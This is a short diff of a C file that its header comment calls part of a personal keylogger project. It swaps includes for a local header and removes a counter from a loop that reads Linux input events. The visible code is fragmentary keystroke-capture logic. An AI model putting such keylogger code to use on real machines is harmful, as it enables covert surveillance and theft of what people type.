@@ -1,10 +1,14 @@
-#include <stdlib.h>
-#include <unistd.h>
-#include <fcntl.h>
-#include <errno.h>
-#include <linux/input.h>
-#include <string.h>
-#include <stdio.h>
+/*
+** input.c for keylogger in /home/azword/delivery/Perso/PSU/Keylogger/srcs
+** 
+** Made by Nathan Tréhout | Az'
+** Login   <nathan.trehout@epitech.eu>
+** 
+** Started on  Sat Dec 31 14:51:40 2016 Nathan Trehout
+** Last update Sat Dec 31 14:59:03 2016 Nathan Trehout
+*/
+
+#include "my.h"
 
 char retmaj(char dest)
 {
@@ -315,7 +319,6 @@ int main()
     }
   while (1)
     {
-      k++;
       n = read(fd, &ev, sizeof ev);
       if (n == (ssize_t) - 1)
 	{
